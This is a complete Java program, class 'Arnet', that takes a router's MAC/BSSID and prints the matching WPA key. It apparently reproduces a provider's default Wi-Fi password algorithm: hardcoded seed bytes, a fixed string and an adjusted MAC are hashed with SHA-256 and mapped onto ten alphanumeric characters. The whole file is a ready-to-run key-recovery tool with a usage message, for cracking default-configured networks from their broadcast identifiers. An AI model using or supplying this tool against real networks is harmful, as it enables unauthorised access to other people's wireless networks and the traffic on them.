import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

public class Arnet {
	public static void main(String[] args)  {
		
		if (args.length != 1)
			 usage();

		String mac = args[0]; 
		String Key = "";
		try{
			Key = generateKey(mac);
		}catch (Exception e){
			usage();
		}
	    
	    System.out.println("MAC .....: " + mac);
	    System.out.println("WPA key .: " + Key);
	
	}
	
	private static void usage(){
		System.out.println("\tusage: java Arnet 74:88:8b:ad:c0:de\n");
		System.exit(0);
	}

	private static String generateKey(String macbssid) throws NoSuchAlgorithmException {

		String lookup   = "0123456789abcdefghijklmnopqrstuvwxyz";
		byte[] seed     = { (byte)0x64,(byte)0xC6,(byte)0xDD,(byte)0xE3,(byte)0xE5,(byte)0x79,(byte)0xB6,(byte)0xD9,
                            (byte)0x86,(byte)0x96,(byte)0x8D,(byte)0x34,(byte)0x45,(byte)0xD2,(byte)0x3B,(byte)0x15,
                            (byte)0xCA,(byte)0xAF,(byte)0x12,(byte)0x84,(byte)0x02,(byte)0xAC,(byte)0x56,(byte)0x00,
			                (byte)0x05,(byte)0xCE,(byte)0x20,(byte)0x75,(byte)0x91,(byte)0x3F,(byte)0xDC,(byte)0xE8 };
		String Key      = "";
		byte[] hash;
		byte[] mac      = new byte[6];
		byte[] hardcode = { 49, 50, 51, 54, 55, 57, 48 }; /* ASCII : 1236790 */
		String macH     = macbssid.replace(":", "").substring(0,6);
		String macL     = macbssid.replace(":", "").substring(6,12);
		String macfinal = macH + String.format("%06x", (((Integer.parseInt(macL,16)) + 1) & 0xFFFFFF));
				
		for (int i = 0; i < 12; i += 2)
			mac[i / 2] = (byte) ((Character.digit(macfinal.charAt(i), 16) << 4) + Character.digit(macfinal.charAt(i + 1), 16));
			
		MessageDigest sha256;
		
		sha256 = MessageDigest.getInstance("SHA-256");
		sha256.reset();
		sha256.update(seed);
		sha256.update(hardcode);
		sha256.update(mac);

		hash = sha256.digest();
		
		for (int i = 0; i < 10; ++i) 
			Key += lookup.charAt((hash[i] & 0xFF)%lookup.length());

		return Key;       
    }
}
